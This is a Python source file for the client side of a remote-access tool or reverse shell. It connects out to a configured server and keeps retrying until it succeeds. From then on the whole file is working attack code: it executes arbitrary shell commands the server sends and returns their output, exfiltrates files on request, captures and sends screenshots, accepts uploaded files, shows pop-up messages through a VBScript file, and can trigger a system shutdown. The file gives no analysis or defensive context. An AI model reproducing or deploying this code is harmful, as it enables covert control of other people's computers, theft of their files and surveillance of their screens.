# -*- coding: utf-8 -*-
"""
Created on Fri Sep 29 16:24:35 2017

@author: Binish125
"""
import time
from queue import Queue
import os
import socket
import subprocess 
from mss import mss


JOB_NUMBER=[1,2]
NUMBER_OF_THREADS=2
queue=Queue()
disableKey=0

def socket_create():
    global s
    global host
    global port
    
    s=socket.socket()
    host="127.0.0.1" #ip of the server
    port=9999
    try:
        s.connect((host,port))
    except:
        socket_create()

def sendFile(filename):
    if os.path.isfile(filename):
        msg="File exists : " + str(os.path.getsize(filename))
        fileSize=int(os.path.getsize(filename))
        s.send(str.encode(msg))
        response=s.recv(1024)
        sentData=0
        if response[:2].decode('utf-8')=="OK":
            rate=s.recv(1024)
            rate=int(rate.decode('utf-8'))
            with open(filename,'rb') as f:
                fileBytes=f.read(rate)
                sentData+=len(fileBytes)
                s.send(fileBytes)
                while fileSize>sentData:
                    fileBytes = f.read(rate)
                    s.send(fileBytes)
                    sentData+=len(fileBytes)
                pass
                print("finished")
            cwd="\n\n"+str(os.getcwd()) + ">"
            s.send(str.encode(cwd))
            print("data sent")
        else:
            cwd="\n\n"+str(os.getcwd()) + ">"
            s.send(str.encode(cwd))
    else:
        s.send(str.encode("ERROR :- NOT A FILE"))
        cwd="\n\n"+str(os.getcwd()) + ">"
        s.send(str.encode(cwd))


def recieveFile(filename):
    first=s.recv(6)
    first=first.decode('utf-8')
    print(first)
    print("e?")
    if(first=="exists"):
        size=s.recv(1024)
        filesize=int(size.decode('utf-8'))
        print("s")
        message=s.recv(1024)
        message=message.decode('utf-8')
        print("c")
        if(message=='Y'):
            print("s")
            rate=s.recv(1024)
            rate=int(rate.decode('utf-8'))
            f=open("new_"+filename,'wb')
            data=s.recv(rate)
            totalRecv=len(data)
            f.write(data)
            while totalRecv<filesize:
                data = s.recv(rate)
                totalRecv+=len(data)
                f.write(data)
            print("f")
            f.close()
            cwd="\n\n"+str(os.getcwd()) + "> "
            s.send(str.encode(cwd))
        else:
            cwd="\n\n"+str(os.getcwd()) + "> "
            s.send(str.encode(cwd))
    else:
        pass
        cwd="\n\n"+str(os.getcwd()) + "> "
        s.send(str.encode(cwd))
        
def main():
    global disableKey
    while True:
        data=s.recv(40960)
        if(data.decode('utf-8')=='checkConn'):
            s.send(str.encode("Connected "))
        elif(data.decode('utf-8')=='shutoff'):
            cmd=subprocess.Popen("shutdown -s -t 60", shell=True)                
        elif(data.decode('utf-8')=="getCWD"):
            s.send(str.encode("\n\n"+str(os.getcwd())+"> "))
        elif(data.decode('utf-8')=='closeConn'):
            break
        elif(data[:11].decode('utf-8')==':screenshot'):
            with mss() as sct:
                sct.shot()
            sendFile("monitor-1.png")
            os.remove("monitor-1.png")
        elif(data[:4].decode('utf-8')==':say'):
            message=data[4:].decode('utf-8')
            file1=open("msg.vbs","w")
            file1.write('msgbox "'+message+'",0,"Message Recieved"')
            file1.close()
            os.startfile("msg.vbs")
            time.sleep(2)
            os.remove("msg.vbs")
            s.send(str.encode("\n\n"+str(os.getcwd())+"> "))
        elif(data[:8].decode('utf-8')=='download'):
            sendFile(data[9:].decode('utf-8'))
        elif(data[:6].decode('utf-8')=='upload'):
            recieveFile(data[7:].decode('utf-8'))
        else:
            if(data[:2].decode('utf-8')=="cd"):
                try:
                  os.chdir(data[3:].decode("utf-8"))
                except:
                    pass
            if(len(data)>0):
                cmd=subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output_bytes=cmd.stdout.read() + cmd.stderr.read()
                output_str=str(output_bytes,"utf-8")
                s.send(str.encode(output_str+"\n\n"+str(os.getcwd()) + "> "))
    s.close()        

socket_create()
main()